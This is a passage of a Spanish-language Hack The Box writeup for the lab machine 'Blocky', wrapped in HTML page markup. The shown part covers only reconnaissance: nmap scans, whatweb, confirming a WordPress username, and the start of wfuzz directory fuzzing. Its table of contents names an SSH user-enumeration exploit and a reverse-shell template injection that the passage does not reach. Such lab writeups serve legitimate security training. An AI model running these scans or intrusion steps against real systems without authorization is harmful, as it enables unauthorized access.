@@ -1,0 +1,1328 @@
+<!DOCTYPE html>
+<html lang="es-MX">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Blocky - Hack The Box · BerserkWings - Hacking Ético</title>
+<meta name="description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+
+<meta http-equiv="Content-Security-Policy"
+      content="default-src 'self';
+               img-src 'self';
+               style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
+               font-src 'self' https://fonts.gstatic.com;
+               script-src 'self' ;
+               connect-src 'self' ;
+               object-src 'none';
+               base-uri 'self';
+               form-action 'self';
+               upgrade-insecure-requests;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+
+<link rel="canonical" href="http://localhost:1313/htb-writeup-blocky/">
+<link rel="icon" href="/assets/images/favicon.png">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@500;600;700&family=Inter:wght@400;500&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/main.min.b51fce260bd224cda026ea0223adf133e0ce779edbb6c14d513c3f101c33a9ff.css" integrity="sha256-tR/OJgvSJM2gJuoCI63xM&#43;DOd57btsFNUTw/EBwzqf8=">
+
+
+<meta property="og:title" content="Blocky - Hack The Box">
+<meta property="og:description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+<meta property="og:type" content="article">
+<meta property="og:image" content="http://localhost:1313/assets/images/htb-writeup-blocky/blocky_logo.png">
+
+
+
+</head>
+<body>
+  <header class="site-header">
+  <div class="wrap">
+    <a class="brand" href="/">
+      
+      <img class="brand-logo" src="http://localhost:1313/assets/images/masthead.png" alt="BerserkWings">
+      
+    </a>
+    <nav class="main-nav">
+      
+        <a href="/" >Inicio</a>
+      
+        <a href="/posts/" >Writeups</a>
+      
+        <a href="/categories/" >Categorías</a>
+      
+        <a href="/tags/" >Etiquetas</a>
+      
+        <a href="/buscador/" >Buscador</a>
+      
+        <a href="/acerca-de-mi/" >Acerca de mí</a>
+      
+    </nav>
+  </div>
+</header>
+
+  <main>
+    
+<canvas class="hero-matrix-bg hero-matrix-bg--dim" id="heroMatrixBg" aria-hidden="true"></canvas>
+<article class="post" id="top">
+  
+
+
+
+
+<aside class="side-profile">
+  <img class="side-avatar" src="http://localhost:1313/assets/images/avatar.png" alt="BerserkWings">
+  <div class="side-name">BerserkWings</div>
+  <div class="side-tagline">Aspirante a Pentester · CTF Player</div>
+
+  
+  <div class="side-platforms">
+    <span class="side-platform-badge">HTB: BerserkWings</span>
+    <span class="side-platform-badge">THL: BerserkWings</span>
+  </div>
+  
+
+  <div class="side-contact">
+    <span class="side-meta">📍 México</span>
+    
+    <a class="side-meta-link" href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">🔗 GitHub</a>
+    
+  </div>
+
+  
+  <div class="side-posts">
+    <div class="side-post-cards">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/htb-writeup-shocker/">
+          <span class="side-post-card-title">Shocker</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/htb-writeup-mirai/">
+          <span class="side-post-card-title">Mirai</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <div class="side-post-card is-current">
+          <span class="side-post-card-title">Blocky</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </div>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/htb-writeup-bank/">
+          <span class="side-post-card-title">Bank</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/htb-writeup-grandpa/">
+          <span class="side-post-card-title">Grandpa</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </a>
+        
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  </div>
+  
+
+  
+
+  
+
+
+</aside>
+
+
+  
+  
+  
+
+  <header class="post-header">
+    
+    <div class="post-meta">HackTheBox / Easy Machine</div>
+    
+    <h1>Blocky - Hack The Box</h1>
+    <div class="post-meta">20 February 2023 · 17 min de lectura</div>
+  </header>
+
+  
+  <img class="post-cover" src="http://localhost:1313/assets/images/htb-writeup-blocky/blocky_logo.png" alt="Blocky - Hack The Box">
+  
+
+  
+  <p class="post-lead">Esta es una máquina bastante sencilla, en donde haremos un Fuzzing y gracias a este descubriremos archivos de Java, que al descompilar uno de ellos contendrá información critica que nos ayudará a loguearnos como Root. Además de que aprendemos a enumerar los usuarios del servicio SSH, es decir, sabremos si estos existen o no en ese servicio gracias al Exploit CVE-2018-15473. También nos aprovecharemos de Wordpress y PHPMyAdmin, para probar algunas formas de ganar acceso a la máquina.</p>
+  
+
+  
+  <details class="post-tools">
+    <summary>🛠 Herramientas utilizadas</summary>
+
+    
+      
+      <ul><li><code>ping</code></li><li><code>nmap</code></li><li><code>whatweb</code></li><li><code>wappalizer</code></li><li><code>wfuzz</code></li><li><code>gobuster</code></li><li><code>jd-gui</code></li><li><code>wpscan</code></li><li><code>searchsploit</code></li><li><code>python2</code></li><li><code>ssh</code></li><li><code>nc</code></li><li><code>sudo</code></li></ul>
+    
+  </details>
+  
+
+  
+  <details class="toc" id="indice" open>
+    <summary>📑 Índice</summary>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+        <li><a href="#Fuzz">Fuzzing</a></li>
+        <li><a href="#Java">Analizando Archivo .jar</a></li>
+        <li><a href="#wpscan">Utilizando la Herramienta WPScan</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#SSH">Forma de Enumerar Usuarios de SSH</a>
+          <ul>
+            <li><a href="#PruebaExp">Probando Exploit: OpenSSH &lt; 7.7 - Username Enumeration (2)</a></li>
+          </ul>
+        </li>
+        <li><a href="#SSH2">Probando Contraseña Encontrada en Servicio SSH</a></li>
+        <li><a href="#PHP">Ganando Acceso a Máquina Usando PhpMyAdmin y Wordpress</a>
+          <ul>
+            <li><a href="#PHP2">Suplantando Código de Template con Código de Reverse Shell de PentestMonkey para Ganar Acceso</a></li>
+            <li><a href="#PHP3">Suplantando Código de Template para Obtener una CMD</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#Enum">Enumeración de Máquina y Escalando Privilegios</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </details>
+  <aside class="side-toc">
+    <div class="side-toc-header">📑 Índice</div>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+        <li><a href="#Fuzz">Fuzzing</a></li>
+        <li><a href="#Java">Analizando Archivo .jar</a></li>
+        <li><a href="#wpscan">Utilizando la Herramienta WPScan</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#SSH">Forma de Enumerar Usuarios de SSH</a>
+          <ul>
+            <li><a href="#PruebaExp">Probando Exploit: OpenSSH &lt; 7.7 - Username Enumeration (2)</a></li>
+          </ul>
+        </li>
+        <li><a href="#SSH2">Probando Contraseña Encontrada en Servicio SSH</a></li>
+        <li><a href="#PHP">Ganando Acceso a Máquina Usando PhpMyAdmin y Wordpress</a>
+          <ul>
+            <li><a href="#PHP2">Suplantando Código de Template con Código de Reverse Shell de PentestMonkey para Ganar Acceso</a></li>
+            <li><a href="#PHP3">Suplantando Código de Template para Obtener una CMD</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#Enum">Enumeración de Máquina y Escalando Privilegios</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </aside>
+  
+
+  <div class="post-content">
+    <h2 id="Recopilacion">Recopilación de Información</h2>
+<h3 id="Ping">Traza ICMP</h3>
+<p>Vamos a realizar un ping para saber si la máquina está conectada y en base al TTL veremos que SO ocupa dicha máquina.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ping -c <span style="color:#ae81ff">4</span> 10.10.10.37                           
+</span></span><span style="display:flex;"><span>PING 10.10.10.37 <span style="color:#f92672">(</span>10.10.10.37<span style="color:#f92672">)</span> 56<span style="color:#f92672">(</span>84<span style="color:#f92672">)</span> bytes of data.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 10.10.10.37: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">63</span> time<span style="color:#f92672">=</span><span style="color:#ae81ff">134</span> ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 10.10.10.37: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">63</span> time<span style="color:#f92672">=</span><span style="color:#ae81ff">135</span> ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 10.10.10.37: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">63</span> time<span style="color:#f92672">=</span><span style="color:#ae81ff">133</span> ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 10.10.10.37: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">63</span> time<span style="color:#f92672">=</span><span style="color:#ae81ff">133</span> ms
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--- 10.10.10.37 ping statistics ---
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span> packets transmitted, <span style="color:#ae81ff">4</span> received, 0% packet loss, time 3003ms
+</span></span><span style="display:flex;"><span>rtt min/avg/max/mdev <span style="color:#f92672">=</span> 132.548/133.548/134.989/0.910 ms
+</span></span></code></pre></div><p>Ok, el TTL nos dice que es una máquina con Linux, hagamos los escaneos.</p>
+<h3 id="Puertos">Escaneo de Puertos</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS --min-rate <span style="color:#ae81ff">5000</span> -vvv -n -Pn 10.10.10.37 -oG allPorts
+</span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked <span style="color:#e6db74">&#39;up&#39;</span> and scan times may be slower.
+</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-02-20 14:50 CST
+</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 14:50
+</span></span><span style="display:flex;"><span>Scanning 10.10.10.37 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Discovered open port 21/tcp on 10.10.10.37
+</span></span><span style="display:flex;"><span>Discovered open port 80/tcp on 10.10.10.37
+</span></span><span style="display:flex;"><span>Discovered open port 22/tcp on 10.10.10.37
+</span></span><span style="display:flex;"><span>Discovered open port 25565/tcp on 10.10.10.37
+</span></span><span style="display:flex;"><span>Increasing send delay <span style="color:#66d9ef">for</span> 10.10.10.37 from <span style="color:#ae81ff">0</span> to <span style="color:#ae81ff">5</span> due to <span style="color:#ae81ff">11</span> out of <span style="color:#ae81ff">23</span> dropped probes since last increase.
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 14:50, 42.20s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.37
+</span></span><span style="display:flex;"><span>Host is up, received user-set <span style="color:#f92672">(</span>0.40s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Scanned at 2023-02-20 14:50:15 CST <span style="color:#66d9ef">for</span> 43s
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65530</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> closed tcp port <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE   REASON
+</span></span><span style="display:flex;"><span>21/tcp    open  ftp       syn-ack ttl <span style="color:#ae81ff">63</span>
+</span></span><span style="display:flex;"><span>22/tcp    open  ssh       syn-ack ttl <span style="color:#ae81ff">63</span>
+</span></span><span style="display:flex;"><span>80/tcp    open  http      syn-ack ttl <span style="color:#ae81ff">63</span>
+</span></span><span style="display:flex;"><span>25565/tcp open  minecraft syn-ack ttl <span style="color:#ae81ff">63</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 42.27 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">196623</span> <span style="color:#f92672">(</span>8.651MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">62</span> <span style="color:#f92672">(</span>2.724KB<span style="color:#f92672">)</span>
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-p-</em></td>
+					<td>Para indicarle un escaneo en ciertos puertos.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;open</em></td>
+					<td>Para indicar que aplique el escaneo en los puertos abiertos.</td>
+			</tr>
+			<tr>
+					<td><em>-sS</em></td>
+					<td>Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;min-rate</em></td>
+					<td>Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).</td>
+			</tr>
+			<tr>
+					<td><em>-vvv</em></td>
+					<td>Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-n</em></td>
+					<td>Para indicar que no se aplique resolución dns para agilizar el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-Pn</em></td>
+					<td>Para indicar que se omita el descubrimiento de hosts.</td>
+			</tr>
+			<tr>
+					<td><em>-oG</em></td>
+					<td>Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Hay 4 puertos abiertos, 3 de ellos ya los conocemos, el <strong>servicio FTP</strong>, el <strong>servicio SSH</strong> y el <strong>servicio HTTP</strong>, pero&hellip;Minecraft? que curioso, veamos que nos dice el escaneo de servicios.</p>
+<h3 id="Servicios">Escaneo de Servicios</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sC -sV -p21,22,80,25565 10.10.10.37 -oN targeted                  
+</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-02-20 14:58 CST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.37
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.13s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE   VERSION
+</span></span><span style="display:flex;"><span>21/tcp    open  ftp       ProFTPD 1.3.5a
+</span></span><span style="display:flex;"><span>22/tcp    open  ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> d62b99b4d5e753ce2bfcb5d79d79fba2 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 5d7f389570c9beac67a01e86e7978403 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 09d5c204951a90ef87562597df837067 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp    open  http      Apache httpd 2.4.18
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://blocky.htb
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.18 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>25565/tcp open  minecraft Minecraft 1.11.2 <span style="color:#f92672">(</span>Protocol: 127, Message: A Minecraft Server, Users: 0/20<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: Host: 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 13.49 seconds
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-sC</em></td>
+					<td>Para indicar un lanzamiento de scripts básicos de reconocimiento.</td>
+			</tr>
+			<tr>
+					<td><em>-sV</em></td>
+					<td>Para identificar los servicios/versión que están activos en los puertos que se analicen.</td>
+			</tr>
+			<tr>
+					<td><em>-p</em></td>
+					<td>Para indicar puertos específicos.</td>
+			</tr>
+			<tr>
+					<td><em>-oN</em></td>
+					<td>Para indicar que el output se guarde en un fichero. Lo llame targeted.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Analizando lo que nos dio el escaneo, el <strong>servicio FTP</strong> no tiene activo el login <strong>Anonymous</strong>, por lo que no sirve tratar de entrar por ahí. No tenemos credenciales del <strong>servicio SSH</strong>, entonces tendremos que irnos por la página web del <strong>servicio HTTP</strong>.</p>
+<h2 id="Analisis">Análisis de Vulnerabilidades</h2>
+<h3 id="HTTP">Analizando Servicio HTTP</h3>
+<p>Veamos que nos dice la página:</p>
+<p><img src="/assets/images/htb-writeup-blocky/Captura1.png" alt=""></p>
+<p>Ok, parece ser que no podemos acceder a la página web, creo que ya sabemos que debemos hacer y que está pasando aquí. Estamos frente a un <strong>Virtual Hosting</strong> pues quiero pensar que cuando metemos la IP de la página, esta nos redirige hacia el puerto 25565, pero nuestra máquina no resuelve la IP con el dominio, por lo que hay que registrarlo.</p>
+<p>Vamos a registrar el nombre del dominio como viene ahí, como <strong>blocky.htb</strong> en el fichero <strong>hosts</strong> del directorio <strong>/etc</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nano /etc/hosts 
+</span></span><span style="display:flex;"><span>10.10.10.37 blocky.htb
+</span></span></code></pre></div><p>Bien, recarguemos la página a ver si ya funciona:</p>
+<p><img src="/assets/images/htb-writeup-blocky/Captura2.png" alt=""></p>
+<p>Excelente, ya funciona. Que nos dice <strong>Wappalizer</strong>:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-blocky/Captura3.png">
+</p>
+<p>Ok, la página esta hecha con <strong>Wordpress</strong>, <strong>PHP</strong> y ahí viene el servidor <strong>Apache</strong>.</p>
+<p>Veamos si la <strong>herramienta whatweb</strong> nos dice algo más:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>whatweb http://10.10.10.37
+</span></span><span style="display:flex;"><span>http://10.10.10.37 <span style="color:#f92672">[</span><span style="color:#ae81ff">302</span> Found<span style="color:#f92672">]</span> Apache<span style="color:#f92672">[</span>2.4.18<span style="color:#f92672">]</span>, Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, HTTPServer<span style="color:#f92672">[</span>Ubuntu Linux<span style="color:#f92672">][</span>Apache/2.4.18 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)]</span>, IP<span style="color:#f92672">[</span>10.10.10.37<span style="color:#f92672">]</span>, RedirectLocation<span style="color:#f92672">[</span>http://blocky.htb<span style="color:#f92672">]</span>, Title<span style="color:#f92672">[</span><span style="color:#ae81ff">302</span> Found<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>http://blocky.htb <span style="color:#f92672">[</span><span style="color:#ae81ff">200</span> OK<span style="color:#f92672">]</span> Apache<span style="color:#f92672">[</span>2.4.18<span style="color:#f92672">]</span>, Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, HTML5, HTTPServer<span style="color:#f92672">[</span>Ubuntu Linux<span style="color:#f92672">][</span>Apache/2.4.18 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)]</span>, IP<span style="color:#f92672">[</span>10.10.10.37<span style="color:#f92672">]</span>, JQuery<span style="color:#f92672">[</span>1.12.4<span style="color:#f92672">]</span>, MetaGenerator<span style="color:#f92672">[</span>WordPress 4.8<span style="color:#f92672">]</span>, PoweredBy<span style="color:#f92672">[</span>WordPress,WordPress,<span style="color:#f92672">]</span>, Script<span style="color:#f92672">[</span>text/javascript<span style="color:#f92672">]</span>, Title<span style="color:#f92672">[</span>BlockyCraft &amp;<span style="color:#75715e">#8211; Under Construction!], UncommonHeaders[link], WordPress[4.8]</span>
+</span></span></code></pre></div><p>Observa que se realizo una redirección y nos llevo de la IP al dominio.</p>
+<p>Y no hay nada nuevo que nos sirva por ahora.</p>
+<p>Veamos que podemos hacer dentro de la página web.</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-blocky/Captura4.png">
+</p>
+<p>Ahí vemos un login y si damos click en <strong>Comments</strong> y <strong>Entries</strong>, nos descargara 2 archivos <strong>XML</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>file JZsE-b6w                    
+</span></span><span style="display:flex;"><span>JZsE-b6w: XML 1.0 document, ASCII text
+</span></span><span style="display:flex;"><span>file OTX7NxW5 
+</span></span><span style="display:flex;"><span>OTX7NxW5: XML 1.0 document, Unicode text, UTF-8 text, with very long lines <span style="color:#f92672">(</span>302<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Los analice un poco rápido, pero no vi nada que nos pueda ayudar de momento, sigamos buscando.</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-blocky/Captura5.png">
+</p>
+<p>Vemos un post y podemos verlo mejor si damos click, entremos.</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-blocky/Captura6.png">
+</p>
+<p>Una vez dentro, podemos comentar también, pero lo importante es que arriba del post aparece un usuario llamado <strong>notch</strong>, supongo que ese debe estar registrado en la página. Vamos al login de <strong>Wordpress</strong>.</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-blocky/Captura7.png">
+</p>
+<p>Va, una vez aquí intentemos ver si existe el <strong>usuario notch</strong>:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-blocky/Captura8.png">
+</p>
+<p>¡Si existe! Puede que ese usuario este registrado en el <strong>SSH</strong>, solo nos falta la contraseña. Ahora hagamos un <strong>Fuzzing</strong> para saber que otras subpáginas hay.</p>
+<h3 id="Fuzz">Fuzzing</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wfuzz -c --hc<span style="color:#f92672">=</span><span style="color:#ae81ff">404</span> -t <span style="color:#ae81ff">200</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://blocky.htb/FUZZ/
+</span></span><span style="display:flex;"><span> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span style="color:#960050;background-color:#1e0010">&#39;</span>s documentation <span style="color:#66d9ef">for</span> more information.
+</span></span><span style="display:flex;"><span>********************************************************
+</span></span><span style="display:flex;"><span>* Wfuzz 3.1.0 - The Web Fuzzer                         *
+</span></span><span style="display:flex;"><span>********************************************************
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Target: http://blocky.htb/FUZZ/
+</span></span><span style="display:flex;"><span>Total requests: 220560
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
+</span></span><span style="display:flex;"><span>ID           Response   Lines    Word       Chars       Payload                                                                     
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>000000241:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">0</span> L      <span style="color:#ae81ff">0</span> W        <span style="color:#ae81ff">0</span> Ch        <span style="color:#e6db74">&#34;wp-content&#34;</span>                                                                
